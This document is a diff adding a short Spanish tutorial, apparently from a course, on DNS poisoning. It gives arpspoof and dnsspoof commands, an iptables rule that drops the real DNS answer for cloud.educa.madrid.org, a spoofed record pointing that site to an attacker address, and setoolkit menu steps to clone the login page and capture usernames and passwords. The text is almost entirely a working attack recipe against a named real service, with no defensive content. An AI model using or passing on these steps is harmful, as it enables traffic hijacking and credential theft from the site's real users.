@@ -1,0 +1,29 @@
+Envenenamiento dns
+Requisitos de finalización
+Con un arpspoof nos haremos pasar por el servidor dns de la red o por el router.
+
+Mediante dnsspoof envenaremos las respuestas, para ello usaremos dnsspoof
+
+# dnsspoof -i eth0 -f resolution.txt
+
+En el archivo resolution.txt pondremos la ip y el nombre al que queremos asociarla.
+
+Para filtrar y eliminar la respuesta del dns legítimo usaremos este filtro de iptables
+
+# iptables --append FORWARD --match string --algo kmp --hex-string 'c1 92 7b 48' --jump DROP
+
+La cadena 'c1 92 7b 48' se corresponde con la dirección ip asociada a cloud.educa.madrid.org (193.146.123.72) en hexadecimal. Debemos añadir esta regla para que no nos llegue la respuesta del dns auténtico más rápido que la nuestra.
+
+10.227.87.112 cloud.educa.madrid.org
+
+Ahora vamos a clonar el sitio web con setoolkit, elegiremos las opciones
+
+1.- Ingenieria social
+
+    2.- web
+
+          3.- credenciales
+
+                 2.- clonar sitio
+
+Cuando metan usuario y contraseña nos saldrá un aviso.
